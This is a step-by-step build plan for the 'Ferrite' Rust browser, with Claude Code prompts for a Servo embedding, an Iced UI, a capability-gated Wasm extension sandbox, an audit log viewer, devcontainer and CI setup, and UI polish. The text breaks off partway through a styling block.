## Task 1: Servo shell
### Block 1: Add `ferrite-servo` crate + Servo dependency  |  ✅ Done
What it does: Creates the new crate and gets Servo compiling as a dependency. Nothing runs yet — just proves the build works with Servo in the tree.

Prompt for Claude Code:
```
Create a new library crate at crates/ferrite-servo in the Cargo workspace.
Add it to the workspace members in the root Cargo.toml.

In crates/ferrite-servo/Cargo.toml add:
[dependencies]
servo = { git = "https://github.com/servo/servo", tag = "v0.0.5" }
raw-window-handle = "0.6"
winit = "0.30"
log = "0.4"

In crates/ferrite-servo/src/lib.rs just add:
// Servo embedding crate — implementation follows in subsequent blocks
pub mod shell;

Create crates/ferrite-servo/src/shell.rs as an empty file with a comment:
// ServoShell implementation — see Block 2
```
Exit condition: `cargo build -p ferrite-servo` compiles successfully.

### Block 2: Window creation with winit  |  ✅ Done
What it does: Creates a native OS window using winit. No Servo yet — just a blank window that opens, stays open, and closes cleanly. Proves the windowing layer works on your machine before adding Servo on top.

Prompt for Claude Code:
```
In crates/ferrite-servo/src/shell.rs implement a ServoShell struct that:
- Has a new() -> Self constructor that creates a winit EventLoop and WindowBuilder with:
  title: "Ferrite Browser"
  inner_size: LogicalSize::new(1280, 800)
- Has a run(self) method that starts the winit event loop, handling:
  WindowEvent::CloseRequested → EventLoopControlFlow::Exit
  WindowEvent::RedrawRequested → window.request_redraw()
  Keep all other events as pass-through for now

In crates/ferrite-shell/src/main.rs add a second binary target or a feature flag so you can run the window separately from the smoke test. The simplest approach: move the smoke test into a fn run_smoke_test() and call either that or ServoShell::new().run() based on a CLI arg (first arg "window" → open window, anything else → smoke test).

Add ferrite-servo as a path dependency in ferrite-shell/Cargo.toml.
```
Exit condition: `cargo run --bin ferrite-shell window` opens a blank window titled "Ferrite Browser" and closes cleanly when you press the 'X' button.

### Block 3: Embed Servo, render a blank page  |  ✅ Done
What it does: Initialises Servo inside the window and loads about:blank. The window now has a live browser engine running in it, even though it shows nothing visible. This is the hardest block — Servo's embedding API has a specific initialisation sequence.

Prompt for Claude Code:
```
In crates/ferrite-servo/src/shell.rs extend ServoShell to embed Servo:

1. Add a servo field: Option<servo::Servo<ServoWindowCallbacks>>

2. Create a ServoWindowCallbacks struct implementing servo::WindowMethods with:
   - get_coordinates() returning a DeviceIntRect for the window size
   - set_animation_state() as a no-op for now
   - get_gl_context() — return a headless software GL context using servo's built-in offscreen rendering
   - get_native_widget() returning the raw window handle from winit

3. In ServoShell::new(), after creating the winit window:
   - Initialise servo::Servo with ServoWindowCallbacks
   - Call servo.handle_events(vec![]) once to let it start up
   - Load "about:blank" via servo.load_uri()

4. In the event loop, on RedrawRequested:
   - Call servo.handle_events(vec![]) to process pending events
   - Call servo.present() to render

Use servo v0.0.5 embedding API. If the exact method names differ from above, use the closest equivalents from the servo embedding crate's public API.
```
Exit condition: `cargo run -p ferrite-shell window` opens a window, Servo initialises without panicking (check terminal — no crash), and the window renders (even if blank/white).

### Block 4: Navigate to a real URL  |  ✅ Done
What it does: Points Servo at https://example.com and renders it. This is the Month 1 R1 milestone — "Servo renders a page".

Prompt for Claude Code:
```
In crates/ferrite-servo/src/shell.rs:

1. Change the initial load from "about:blank" to "https://example.com"

2. Add a LoadComplete callback to ServoWindowCallbacks so it logs when the page finishes loading:
   - Implement the load_ended() or navigation_complete() method (whichever exists in servo v0.0.5 WindowMethods)
   - Log: println!("[ferrite] page load complete: {}", url)

3. In the event loop, add handling for winit keyboard input:
   - If the user presses Escape → exit the event loop cleanly

4. Make sure servo.handle_events() is being called on every MainEventsCleared event (not just RedrawRequested) so Servo's internal event loop makes progress.
```
Exit condition: `cargo run -p ferrite-shell window` opens a window, loads https://example.com, and the page content is visible. Terminal prints the load complete message.

### Block 5: Wire the capability broker to Servo's network requests  |  ✅ Done
What it does: Intercepts outgoing network requests from Servo and routes them through `CapabilityBroker::check()` before allowing them. Denied requests are blocked. This is the first real integration of the broker with the engine.

Prompt for Claude Code:
```
In crates/ferrite-servo/src/shell.rs:

1. Add a CapabilityBroker field to ServoShell (import ferrite-capability-broker as a path dep in ferrite-servo/Cargo.toml)

2. On startup, mint a NetworkFetch token for origin "*" (wildcard) with a 3600s TTL — this is the "default allow" token that lets Servo load pages normally

3. Implement the resource_timing_listener or fetch_interceptor hook in ServoWindowCallbacks (whichever servo v0.0.5 exposes for intercepting network requests):
   - On each outgoing request URL, call broker.check(token_id, url)
   - If Granted → allow the request to proceed
   - If Denied → cancel the request and log: println!("[ferrite] BLOCKED: {} reason: {:?}", url, reason)

4. Add a test: after the page loads, call broker.revoke(token_id), then navigate to "https://example.com/test" — the request should be blocked and logged.

If servo v0.0.5 does not expose a fetch interceptor hook, implement this instead:
   - Override the resource_thread or net_traits::ResourceFetchTiming to wrap requests
   - Document in a code comment exactly which API was used and what is not yet hookable
```
Exit condition: Blocking the token stops network requests. Terminal shows `[ferrite] BLOCKED:` log lines when the token is revoked.

### Block 6: Log broker decisions to the audit log  |  ✅ Done
What it does: Every network request decision (grant or deny) is written to `PersistentAuditLog`. This closes the loop — Servo → broker → audit log — which is the core architecture working end-to-end for the first time.

Prompt for Claude Code:
```
In crates/ferrite-servo/src/shell.rs:

1. Add a PersistentAuditLog field to ServoShell (import ferrite-audit-log as a path dep in ferrite-servo/Cargo.toml)
   - Initialise at: std::env::temp_dir().join("ferrite_servo.db")

2. In the fetch interceptor from Block 5:
   - On Granted: call audit_log.append(AuditEventKind::CapabilityGranted, principal_id, Some("network.fetch"), Some(url))
   - On Denied: call audit_log.append(AuditEventKind::CapabilityDenied, principal_id, Some("network.fetch"), Some(url))

3. On Escape key press (clean exit), before the event loop exits:
   - Call audit_log.log.verify_chain()
   - If true: println!("[ferrite] audit chain verified: {} entries", audit_log.log.entries.len())
   - If false: println!("[ferrite] AUDIT CHAIN BROKEN — investigate immediately")

4. Print a summary on exit: how many grants, how many denials.
```
Exit condition: On exit, terminal shows the audit chain verified message with a non-zero entry count. The SQLite file exists at the temp path and contains rows.

## Task 2: Iced UI Shell
### Block 1: `ferrite-ui` crate, Iced hello-world with dark theme  |  ✅ Done
What it does: Creates the ferrite-ui crate, gets Iced running with a dark theme window at the right size. Nothing functional yet — just proves Iced renders on your machine.

Prompt for Claude Code:
```
Create a new library crate at crates/ferrite-ui in the Cargo workspace.
Add it to workspace members in root Cargo.toml.

In crates/ferrite-ui/Cargo.toml add:
[dependencies]
iced = { version = "0.13", features = ["tokio"] }

Create crates/ferrite-ui/src/lib.rs with:
- A public FerriteBrowser struct implementing iced::Application
- Title: "Ferrite Browser"
- Window size: 1280 x 800
- Theme: iced::Theme::Dark
- Message enum: FerriteBrowserMessage (empty for now)
- view() returns a centered Text widget saying "Ferrite Browser — loading..."
- update() is a no-op match
- A pub fn launch() -> iced::Result that calls FerriteBrowser::run() with default settings

Add ferrite-ui as a path dependency in ferrite-shell/Cargo.toml.
In ferrite-shell/src/main.rs, add a CLI arg branch: if first arg is "ui" → call ferrite_ui::launch().
```
Exit condition: `cargo run -p ferrite-shell ui` opens a 1280x800 window titled "Ferrite Browser" with a dark theme and the text "Ferrite Browser — loading..." centered. The window closes cleanly when you press the 'X' button.

### Block 2: Tab bar component (add/close tabs, active tab highlights)  |  ✅ Done
What it does: Adds a working tab bar at the top of the window. Tabs can be added and closed. The active tab is visually highlighted. No browser content behind it yet.

Prompt for Claude Code:
```
In crates/ferrite-ui/src/lib.rs extend FerriteBrowser with a tab bar:

1. Add to FerriteBrowserMessage:
   - AddTab
   - CloseTab(usize)
   - SelectTab(usize)

2. Add to FerriteBrowser state:
   - tabs: Vec<String>  (each String is the tab label, start with one tab: "New Tab")
   - active_tab: usize

3. Implement update() to handle all three messages:
   - AddTab → push "New Tab" to tabs, set active_tab to new index
   - CloseTab(i) → remove tabs[i], clamp active_tab to tabs.len().saturating_sub(1)
   - SelectTab(i) → set active_tab = i

4. Implement view() to show:
   - A top Row of tab buttons, each showing its label
   - The active tab button is visually distinct (different background or bold text)
   - Each tab has a small "×" button next to its label that sends CloseTab(i)
   - A "+" button at the end of the row that sends AddTab
   - Below the tab bar: a placeholder Text showing "Tab {active_tab} content"

Style with dark theme colours — tab bar background slightly lighter than window background.
```
Exit condition:
`cargo run -p ferrite-shell ui` shows a tab bar. Clicking "+" adds a tab. Clicking "×" removes it. Clicking a tab label selects it.

### Block 3: Address bar component (text input, URL submit on Enter)  |  ✅ Done
What it does: Adds an address bar below the tab bar. The user can type a URL and press Enter. The URL is stored in state and displayed as the current tab's URL. No actual navigation yet — that wires up when Servo is integrated.

Prompt for Claude Code:
```
In crates/ferrite-ui/src/lib.rs extend FerriteBrowser with an address bar:

1. Add to FerriteBrowserMessage:
   - AddressBarChanged(String)
   - NavigateRequested(String)

2. Add to FerriteBrowser state:
   - address_bar_input: String  (the live text field content)
   - tab_urls: Vec<String>      (the committed URL per tab, default "about:blank")

3. Update update():
   - AddressBarChanged(s) → set address_bar_input = s
   - NavigateRequested(url) → set tab_urls[active_tab] = url, log: println!("[ferrite-ui] navigate requested: {}", url)

4. Update view() to show between the tab bar and content area:
   - A full-width TextInput widget bound to address_bar_input
   - Placeholder text: "Enter URL..."
   - on_input sends AddressBarChanged
   - on_submit sends NavigateRequested(address_bar_input.clone())
   - Below the address bar: Text showing "Current URL: {tab_urls[active_tab]}"

Keep all existing tab bar behaviour intact.
```
Exit condition:
`cargo run -p ferrite-shell ui` shows the tab bar and address bar. Typing a URL and pressing Enter updates the displayed current URL and prints the navigate log line.

## Task 3: Extism Extension Sandbox
### Block 1: `ferrite-sandbox` crate, Extism setup, Wasm module loading  |  ✅ Done
What it does: Creates the ferrite-sandbox crate, adds Extism, and loads a pre-compiled Wasm module from disk. The module doesn't do anything meaningful yet — just proves Extism initialises and a .wasm file can be loaded.

Prompt for Claude Code:
```
Create a new library crate at crates/ferrite-sandbox in the Cargo workspace.
Add it to workspace members in root Cargo.toml.

In crates/ferrite-sandbox/Cargo.toml add:
[dependencies]
extism = "1"
thiserror = "1"
log = "0.4"

In crates/ferrite-sandbox/src/lib.rs implement:

1. SandboxError enum using thiserror:
   - LoadFailed(String)
   - CallFailed(String)
   - CapabilityDenied(String)

2. ExtensionSandbox struct with:
   - A new(wasm_path: &str) -> Result<Self, SandboxError> constructor that:
     - Reads the .wasm file from wasm_path
     - Creates an extism::Plugin from the bytes with no host functions yet
     - Stores it in the struct
   - A ping(&mut self) -> Result<String, SandboxError> method that:
     - Calls the Wasm export "ping" with no input
     - Returns the string output, or SandboxError::CallFailed if the export doesn't exist

3. Create a minimal test Wasm module as a Rust project at extensions/hello-ext/:
   - Cargo.toml: crate-type = ["cdylib"], no_std not required
   - src/lib.rs: export a "ping" function using extism_pdk that returns the string "pong"
   - Add a build script note: compile with: cargo build --target wasm32-unknown-unknown --release
     output will be at extensions/hello-ext/target/wasm32-unknown-unknown/release/hello_ext.wasm

Add ferrite-sandbox as a path dependency in ferrite-shell/Cargo.toml.
In ferrite-shell/src/main.rs add CLI arg "sandbox" → instantiate ExtensionSandbox with the hello-ext wasm path and call ping(), print the result.
```
Exit condition: After compiling `hello-ext` to Wasm and running `cargo run -p ferrite-shell sandbox`, terminal prints `pong`.

### Block 2: Host functions for `dom.read`, `network.fetch`, `storage.read`  |  ✅ Done
What it does: Defines host functions that Wasm extensions can call to request capabilities — host_dom_read, host_network_fetch, host_storage_read. Each host function checks with CapabilityBroker before doing anything. No real DOM or network access yet — host functions return stub data if granted, or an error string if denied.

Prompt for Claude Code:
```
In crates/ferrite-sandbox/src/lib.rs extend ExtensionSandbox with host functions:

1. Add ferrite-capability-broker as a path dependency in ferrite-sandbox/Cargo.toml

2. Add a CapabilityBroker field to ExtensionSandbox
   - Mint three tokens on construction (one per capability), all scoped to origin "*", 3600s TTL:
     - DomRead token
     - NetworkFetch token
     - StorageRead token
   - Store the token IDs alongside the broker

3. Define three host functions using extism's host function API:
   - host_dom_read(selector: &str) -> String
     Calls broker.check(dom_read_token, "*")
     If Granted → return "<div>stub DOM content for selector: {selector}</div>"
     If Denied → return "ERROR: dom.read denied"

   - host_network_fetch(url: &str) -> String
     Calls broker.check(network_fetch_token, url)
     If Granted → return "stub response body for: {url}"
     If Denied → return "ERROR: network.fetch denied"

   - host_storage_read(key: &str) -> String
     Calls broker.check(storage_read_token, "*")
     If Granted → return "stub value for key: {key}"
     If Denied → return "ERROR: storage.read denied"

4. Rebuild the extism::Plugin in new() to include all three host functions

5. Update extensions/hello-ext/src/lib.rs to export three new functions using extism_pdk:
   - test_dom_read: calls host_dom_read("h1") and returns the result
   - test_network_fetch: calls host_network_fetch("https://example.com/api") and returns the result
   - test_storage_read: calls host_storage_read("user_prefs") and returns the result
```
Exit condition: Running `cargo run -p ferrite-shell sandbox` calls all three test functions and prints the stub responses. Revoking a token before the call prints the denied error instead.

### Block 3: Demo extension: Wasm module that calls `host_dom_read` and receives a response  |  ✅ Done
What it does: Wires the sandbox to the audit log so every host function call — granted or denied — is recorded. Then runs a complete demo: extension loads, calls `host_dom_read`, gets stub DOM back, and the entire interaction is in the audit log with a verified chain. This is the Month 2 milestone.

Prompt for Claude Code:
```
In crates/ferrite-sandbox/src/lib.rs:

1. Add ferrite-audit-log as a path dependency in ferrite-sandbox/Cargo.toml

2. Add a PersistentAuditLog field to ExtensionSandbox
   - Initialise at std::env::temp_dir().join("ferrite_sandbox.db")

3. Update each host function to append to the audit log after the broker decision:
   - host_dom_read granted → AuditEventKind::CapabilityGranted, capability: "dom.read", url: selector
   - host_dom_read denied → AuditEventKind::CapabilityDenied, capability: "dom.read", url: selector
   - Same pattern for host_network_fetch and host_storage_read

4. Add a ExtensionSandbox::run_demo(&mut self) method that:
   - Calls the Wasm export "test_dom_read" → prints result
   - Calls the Wasm export "test_network_fetch" → prints result
   - Calls the Wasm export "test_storage_read" → prints result
   - Then revokes the DomRead token
   - Calls "test_dom_read" again → should print denied error
   - Calls audit_log.log.verify_chain() → assert true
   - Prints summary:
     "[ferrite-sandbox] demo complete — X audit entries, chain verified"

5. Update ferrite-shell/src/main.rs CLI arg "sandbox" to call run_demo() instead of ping()
```
Exit condition: `cargo run -p ferrite-shell sandbox` prints all three stub responses, then the denied error for the revoked token, then the audit summary with chain verified. This is the Month 2 R2 milestone — extension loads, executes, and receives capabilities.


## Task 4: Audit Log Viewer Panel
### Block 1: Audit log viewer panel in Iced  |  ✅ Done
What it does: Adds a DevTools-style panel inside the Iced UI that reads audit entries from the SQLite database and displays them in a scrollable table — principal, capability, URL, grant/deny, timestamp. Reads live from the DB so it reflects real sandbox and broker activity.

Prompt for Claude Code:
```
In crates/ferrite-ui/src/lib.rs extend FerriteBrowser with an audit log viewer panel:

1. Add ferrite-audit-log as a path dependency in crates/ferrite-ui/Cargo.toml

2. Add to FerriteBrowser state:
   - show_audit_panel: bool  (default false)
   - audit_entries: Vec<ferrite_audit_log::AuditEntry>  (default empty)

3. Add to FerriteBrowserMessage:
   - ToggleAuditPanel
   - RefreshAuditLog

4. Add to update():
   - ToggleAuditPanel → toggle show_audit_panel
   - RefreshAuditLog → attempt to load PersistentAuditLog from
     std::env::temp_dir().join("ferrite_sandbox.db"),
     if successful set audit_entries = log.entries cloned,
     if file doesn't exist yet set audit_entries = vec![]

5. In view(), add below the address bar:
   - A toolbar row with:
     - A "Audit Log" toggle button that sends ToggleAuditPanel
       (visually active/inactive based on show_audit_panel)
     - A "Refresh" button (only visible when show_audit_panel is true)
       that sends RefreshAuditLog

   - When show_audit_panel is true, render a scrollable table below the
     toolbar with columns:
     Seq | Timestamp | Kind | Principal | Capability | URL
     Each row maps to one AuditEntry.
     Kind should display as "GRANTED" (green text) or "DENIED" (red text)
     for CapabilityGranted/CapabilityDenied, and "EXERCISED"/"BLOCKED"
     for the others.
     Truncate long URLs to 40 chars with "..." suffix.
     Use a monospace-style small font (size 12) for table rows.
     When show_audit_panel is false, render the normal content area instead.

6. The audit panel height should be fixed at 250px, sitting above the
   main content area (not replacing it) — like a real DevTools drawer.
```
Exit condition: `cargo run -p ferrite-shell ui` shows the window. Clicking "Audit Log" opens the panel. Clicking "Refresh" after running the sandbox demo populates it with rows showing GRANTED and DENIED entries with correct colours.

## Task 5: Wire Servo WebView into the Iced UI
### Block 1: Embed Servo render surface inside Iced content area  |  ✅ Done
What it does: Replaces the "Tab N content" placeholder in the Iced UI with the actual Servo-rendered WebView. Servo renders into a texture/surface that Iced composites into the window.

Prompt for Claude Code:
```
In crates/ferrite-ui/src/lib.rs and crates/ferrite-servo/src/shell.rs:

1. Add ferrite-servo as a path dependency in crates/ferrite-ui/Cargo.toml

2. Add to FerriteBrowser state:
   - servo_shell: Option<ferrite_servo::shell::ServoShell>

3. Add to FerriteBrowserMessage:
   - ServoReady
   - ServoFrame  (emitted each time Servo has a new frame to display)

4. In FerriteBrowser::default(), initialise servo_shell as None.
   Add a subscription that initialises ServoShell on startup and emits
   ServoReady, then emits ServoFrame on each animation tick.

5. In view(), when servo_shell is Some:
   - Replace the "Tab N content" placeholder with an iced::widget::image
     or canvas widget that displays the latest frame rendered by Servo.
   - Servo renders to an offscreen buffer; read it as raw RGBA bytes and
     wrap in iced::widget::image::Handle::from_rgba().

6. Forward NavigateRequested(url) messages to ServoShell::navigate(url)
   so typing a URL in the address bar actually drives Servo.
```
Exit condition: `cargo run -p ferrite-shell ui` shows a real browser viewport. Typing https://example.com in the address bar and pressing Enter renders the page inside the Iced window.

### Block 2: Per-tab Servo sessions  |  ✅ Done
What it does: Each tab gets its own Servo browsing context. Opening a new tab creates a new session; closing a tab destroys it. Navigate commands go to the active tab's session only.

Prompt for Claude Code:
```
In crates/ferrite-ui/src/lib.rs:

1. Replace servo_shell: Option<ServoShell> with
   servo_sessions: HashMap<usize, ServoShell>
   where the key is the tab index.

2. On AddTab: create a new ServoShell for the new tab index,
   load "about:blank" in it.

3. On CloseTab(i): call servo_sessions.remove(&i), then re-key
   remaining sessions to reflect the new indices after removal.

4. On SelectTab(i): switch the active render source to servo_sessions[i].

5. On NavigateRequested(url): call servo_sessions[active_tab].navigate(url)

6. In view(): render the frame from servo_sessions[active_tab].
```
Exit condition: Opening two tabs and navigating each to a different URL shows independent pages. Closing one tab doesn't affect the other.

## Task 6: Containerization
### Block 1:
What it does: Creates a multi-stage Dockerfile. First stage installs all Servo build dependencies and pre-warms the Cargo registry by doing a dependency-only build. Second stage is the working image. Cargo's registry and compiled dependencies are cached in a Docker layer so subsequent builds only recompile changed code — not re-download crates.

```
Create .devcontainer/Dockerfile at the repo root
(C:\Users\Divit\OneDrive\Desktop\Major Project\.devcontainer\Dockerfile)
with this exact content:

FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive
ENV CARGO_HOME=/usr/local/cargo
ENV RUSTUP_HOME=/usr/local/rustup
ENV PATH=/usr/local/cargo/bin:$PATH

# ── System dependencies ────────────────────────────────────────────────────
# Servo requires: clang, lld, cmake, pkg-config, python3, gstreamer,
# libdbus, libfreetype, libfontconfig, libssl, libxcb + friends
RUN apt-get update && apt-get install -y --no-install-recommends \
    build-essential \
    curl \
    git \
    pkg-config \
    cmake \
    clang \
    lld \
    llvm \
    python3 \
    python3-pip \
    libssl-dev \
    libdbus-1-dev \
    libfreetype6-dev \
    libfontconfig1-dev \
    libglib2.0-dev \
    libgstreamer1.0-dev \
    libgstreamer-plugins-base1.0-dev \
    libgstreamer-plugins-bad1.0-dev \
    gstreamer1.0-plugins-base \
    gstreamer1.0-plugins-good \
    gstreamer1.0-plugins-bad \
    libxcb1-dev \
    libxcb-render0-dev \
    libxcb-shape0-dev \
    libxcb-xfixes0-dev \
    libx11-dev \
    libxext-dev \
    libxrandr-dev \
    libxi-dev \
    libxcursor-dev \
    sqlite3 \
    libsqlite3-dev \
    ca-certificates \
    && rm -rf /var/lib/apt/lists/*

# ── Rust toolchain ─────────────────────────────────────────────────────────
RUN curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | \
    sh -s -- -y --default-toolchain stable --no-modify-path && \
    rustup target add wasm32-unknown-unknown && \
    rustup component add clippy rustfmt rust-analyzer

# ── Pre-warm Cargo registry ────────────────────────────────────────────────
# Copy only manifests first so this layer is cached unless deps change.
WORKDIR /build/Browser
COPY Browser/Cargo.toml ./Cargo.toml
COPY Browser/crates/ferrite-shell/Cargo.toml          ./crates/ferrite-shell/Cargo.toml
COPY Browser/crates/ferrite-capability-broker/Cargo.toml ./crates/ferrite-capability-broker/Cargo.toml
COPY Browser/crates/ferrite-audit-log/Cargo.toml      ./crates/ferrite-audit-log/Cargo.toml
COPY Browser/crates/ferrite-policy/Cargo.toml         ./crates/ferrite-policy/Cargo.toml
COPY Browser/crates/ferrite-servo/Cargo.toml          ./crates/ferrite-servo/Cargo.toml
COPY Browser/crates/ferrite-ui/Cargo.toml             ./crates/ferrite-ui/Cargo.toml
COPY Browser/crates/ferrite-sandbox/Cargo.toml        ./crates/ferrite-sandbox/Cargo.toml

# Create stub lib.rs / main.rs for each crate so `cargo fetch` resolves fully
RUN for dir in \
        ferrite-capability-broker \
        ferrite-audit-log \
        ferrite-policy \
        ferrite-servo \
        ferrite-ui \
        ferrite-sandbox; do \
    mkdir -p crates/$dir/src && \
    echo "// stub" > crates/$dir/src/lib.rs; \
    done && \
    mkdir -p crates/ferrite-shell/src && \
    echo "fn main(){}" > crates/ferrite-shell/src/main.rs

# Fetch all dependencies (populates CARGO_HOME registry cache)
RUN cargo fetch

# ── Working directory for actual development ───────────────────────────────
WORKDIR /workspace
```
Exit condition: `docker build -f .devcontainer/Dockerfile -t ferrite-dev .` from the `Major Project\` root completes without errors. The image exists locally.

### Block 2:
What it does: Creates `.devcontainer/devcontainer.json` so Antigravity detects the container automatically and offers to reopen inside it. Mounts the repo, sets the workspace, installs extensions, forwards port 9222 for the future agent WebSocket server.

```
Create .devcontainer/devcontainer.json at the repo root
(C:\Users\Divit\OneDrive\Desktop\Major Project\.devcontainer\devcontainer.json)
with this content:

{
  "name": "Ferrite Browser Dev",
  "build": {
    "dockerfile": "Dockerfile",
    "context": ".."
  },
  "workspaceFolder": "/workspace",
  "mounts": [
    "source=${localWorkspaceFolder},target=/workspace,type=bind,consistency=cached",
    "source=ferrite-cargo-cache,target=/usr/local/cargo/registry,type=volume",
    "source=ferrite-target-cache,target=/workspace/Browser/target,type=volume"
  ],
  "forwardPorts": [9222],
  "portsAttributes": {
    "9222": {
      "label": "Ferrite Agent WebSocket",
      "onAutoForward": "silent"
    }
  },
  "customizations": {
    "antigravity": {
      "extensions": [
        "rust-lang.rust-analyzer",
        "serayuzgur.crates",
        "tamasfe.even-better-toml",
        "vadimcn.vscode-lldb"
      ],
      "settings": {
        "rust-analyzer.cargo.buildScripts.enable": true,
        "rust-analyzer.checkOnSave.command": "clippy",
        "rust-analyzer.checkOnSave.extraArgs": ["--", "-D", "warnings"],
        "terminal.integrated.defaultProfile.linux": "bash"
      }
    },
    "vscode": {
      "extensions": [
        "rust-lang.rust-analyzer",
        "serayuzgur.crates",
        "tamasfe.even-better-toml",
        "vadimcn.vscode-lldb"
      ]
    }
  },
  "postCreateCommand": "cd /workspace/Browser && cargo fetch",
  "remoteUser": "root"
}

Also create .devcontainer/.dockerignore at the same path:
target/
.git/
*.pdf
*.pptx
*.html
```
Exit condition: Antigravity shows a "Reopen in Container" notification when the `Major Project` folder is opened. Accepting it builds and opens the container. `rustc --version` inside the container terminal prints stable Rust.

### Block 3:
What it does: Updates `.github/workflows/ci.yml` to install the same system dependencies as the Dockerfile so CI matches the local container environment exactly. Also adds the `wasm32-unknown-unknown` target and runs `cargo fetch` before building to use GitHub's cache effectively.

```
Replace the contents of .github/workflows/ci.yml with:

name: CI

on:
  push:
    branches: [main]
    paths:
      - 'Browser/**'
      - '.devcontainer/**'
      - '.github/workflows/ci.yml'
  pull_request:
    branches: [main]
    paths:
      - 'Browser/**'
      - '.devcontainer/**'
      - '.github/workflows/ci.yml'

defaults:
  run:
    working-directory: Browser

jobs:
  ci:
    name: Build, Lint & Test
    runs-on: ubuntu-22.04

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install system dependencies
        run: |
          sudo apt-get update && sudo apt-get install -y --no-install-recommends \
            pkg-config cmake clang lld llvm python3 \
            libssl-dev libdbus-1-dev libfreetype6-dev libfontconfig1-dev \
            libglib2.0-dev \
            libgstreamer1.0-dev libgstreamer-plugins-base1.0-dev \
            libgstreamer-plugins-bad1.0-dev \
            libxcb1-dev libxcb-render0-dev libxcb-shape0-dev \
            libxcb-xfixes0-dev libx11-dev \
            sqlite3 libsqlite3-dev
        working-directory: .

      - name: Install Rust stable
        uses: dtolnay/rust-toolchain@stable
        with:
          components: rustfmt, clippy
          targets: wasm32-unknown-unknown

      - name: Cache dependencies
        uses: Swatinem/rust-cache@v2
        with:
          workspaces: Browser

      - name: Fetch dependencies
        run: cargo fetch

      - name: Check formatting
        run: cargo fmt --check

      - name: Clippy (zero warnings)
        run: cargo clippy --workspace -- -D warnings

      - name: Run tests
        run: cargo test --workspace

      - name: Build hello-ext Wasm
        run: |
          cd ../extensions/hello-ext
          cargo build --target wasm32-unknown-unknown --release
        working-directory: Browser
```
Exit condition: Push to main. GitHub Actions runs green on the updated workflow including the Wasm build step.

## Task 7: UI Polish 1.0
### Block 1: Navigation controls + loading state  |  ✅ Done
What it does: Adds back/forward/reload/stop buttons to the toolbar. Adds a loading indicator (animated progress bar under the address bar) that appears when a page is loading. Address bar updates to the actual loaded URL after navigation. Requires adding a message channel from `HeadlessServoSession` back to the Iced event loop for load status events.

Prompt for Claude Code:
```
In crates/ferrite-servo/src/session.rs:

1. Add a LoadStatus enum:
   pub enum LoadStatus { Loading, Complete, Failed(String) }

2. Add to HeadlessServoSession:
   - last_load_status: LoadStatus (default Loading)
   - current_url: String (default "about:blank")
   - pub fn load_status(&self) -> &LoadStatus
   - pub fn current_url(&self) -> &str

3. In HeadlessDelegate (WebViewDelegate impl):
   - Implement notify_load_status_changed (or equivalent in servo v0.0.5):
     LoadStatus::Complete → store in session, update current_url
     LoadStatus::Failed → store error string

4. In HeadlessServoSession::spin():
   - After servo event loop tick, update self.last_load_status from delegate

---

In crates/ferrite-ui/src/lib.rs:

1. Add to FerriteBrowser state:
   - is_loading: bool (default false)
   - can_go_back: bool (default false)
   - can_go_forward: bool (default false)

2. Add to FerriteBrowserMessage:
   - GoBack
   - GoForward
   - Reload
   - StopLoading
   - LoadStatusChanged { tab: usize, status: String, url: String }

3. Add to update():
   - GoBack → call session.go_back() if exists, set is_loading = true
   - GoForward → call session.go_forward() if exists, set is_loading = true
   - Reload → call session.reload() if exists, set is_loading = true
   - StopLoading → call session.stop() if exists, set is_loading = false
   - LoadStatusChanged → update is_loading, update address_bar_input and
     tab_urls[tab] to the new url if different from what was typed
   - NavigateRequested → set is_loading = true (immediately on submit)

4. In the ServoFrame tick in update(), after spin():
   - Read session.load_status() and send LoadStatusChanged if it changed
   - Read session.can_go_back() and session.can_go_forward() and update state

5. In view(), replace the current address bar row with a proper toolbar:
   
   Row layout (left to right):
   [←] [→] [⟳/✕]   [🔒 https://... address bar (fills width) ]
   
   - Back button (←): sends GoBack, disabled (greyed) when can_go_back = false
   - Forward button (→): sends GoForward, disabled when can_go_forward = false
   - Reload/Stop button: shows ⟳ when not loading (sends Reload),
     shows ✕ when is_loading = true (sends StopLoading)
   - Address bar: full width text_input as before
   - Show a lock icon (🔒) prefix in the address bar when url starts with https://
   
   Below the toolbar, when is_loading = true:
   - A thin (3px) progress bar spanning full width using primary accent colour
   - Animate it as a moving stripe (indeterminate) using iced subscription tick
   - Hide it completely when is_loading = false
```
Exit condition: `cargo run -p ferrite-shell ui` shows the toolbar with back/forward/reload buttons. The progress bar appears when navigating and disappears when the page loads. The address bar updates to the final URL after navigation.

### Block 2: Visual chrome overhaul  |  ✅ Done
What it does: Redesigns the overall visual layout to look like a real browser. Consistent spacing, proper colour hierarchy, improved tab design, tighter typography. No functional changes — purely visual.

Prompt for Claude Code:
```
In crates/ferrite-ui/src/lib.rs, apply the following visual changes:

LAYOUT CONSTANTS (define as const at top of file):
  TOOLBAR_HEIGHT: f32 = 44.0
  TAB_BAR_HEIGHT: f32 = 36.0
  TAB_MIN_WIDTH: f32 = 120.0
  TAB_MAX_WIDTH: f32 = 240.0
  BORDER_RADIUS: f32 = 6.0
  PANEL_PADDING: u16 = 8

COLOUR PALETTE (derive from iced Theme::Dark extended palette):
  - Window background: palette.background.base.color (darkest)
  - Tab bar background: palette.background.weak.color (slightly lighter)
  - Toolbar background: palette.background.base.color (same as window)
  - Active tab: palette.primary.base.color with 0.15 alpha overlay
  - Address bar background: palette.background.strong.color
  - Text primary: palette.background.base.text
  - Text secondary: Color { a: 0.6, ..palette.background.base.text }
  - Accent: palette.primary.strong.color
  - Danger: palette.danger.base.color

TAB BAR changes:
  - Fixed height TAB_BAR_HEIGHT
  - Each tab is a rounded rectangle (BORDER_RADIUS) with horizontal padding 12px
  - Tab label text: size 13, truncated to TAB_MAX_WIDTH
  - Active tab has a 2px bottom border in accent colour
  - Inactive tabs have no border, hover shows background.strong
  - Close (×) button is 16x16, only visible on hover of that tab
  - "+" button is square, 36x36, at right end of tab strip
  - Tab strip scrolls horizontally if tabs overflow (use iced Scrollable horizontal)

TOOLBAR changes:
  - Fixed height TOOLBAR_HEIGHT
  - Back/Forward buttons: 32x32 rounded squares, icon text size 16
  - Reload/Stop button: 32x32 rounded square
  - 8px gap between navigation buttons and address bar
  - Address bar: height 32px, border radius 16px (pill shape),
    background address bar colour, 10px horizontal padding inside
    font size 13, monospace-ish (use default but size 13)
  - Lock icon left of URL text, colour: green if https, grey if http/other
  - 8px padding on each side of toolbar

GENERAL:
  - 1px separator line between tab bar and toolbar (use palette.background.strong)
  - 1px separator line between toolbar and viewport
